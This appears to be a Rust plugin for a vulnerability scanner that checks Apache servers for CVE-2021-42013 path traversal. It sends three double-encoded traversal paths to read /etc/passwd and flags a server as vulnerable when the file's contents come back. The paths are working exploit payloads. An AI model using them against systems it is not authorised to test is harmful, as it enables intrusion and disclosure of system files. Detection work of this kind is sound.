/* http-vuln-cve2021-42013-3 - CVE-2021-42013 Apache path traversal */
#![allow(dead_code)]
mod arsenal;
use arsenal::*;

#[no_mangle]
pub extern "C" fn almap_script_run(ctx: *mut AlScriptContext) -> i32 {
    let paths = [
        "/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/etc/passwd",
        "/cgi-bin/.%%32%65/.%%32%65/etc/passwd",
        "/icons/%%32%65%%32%65/etc/passwd",
    ];
    let mut found = 0usize;
    for p in paths.iter() {
        let resp = match http_request(ctx, "GET", p, None, "", "", None, 8192) {
            Some(r) if !r.is_empty() => r,
            _ => continue,
        };
        if contains_ci(http_body(&resp), "root:") {
            append_out(ctx, &format!("{}{}",
                if found == 0 { "VULNERABLE: " } else { ", " }, p));
            found += 1;
        }
    }
    if found == 0 {
        set_out(ctx, "not vulnerable: CVE-2021-42013 Apache path traversal");
    } else {
        append_out(ctx, " (CVE-2021-42013 Apache path traversal)");
    }
    0
}
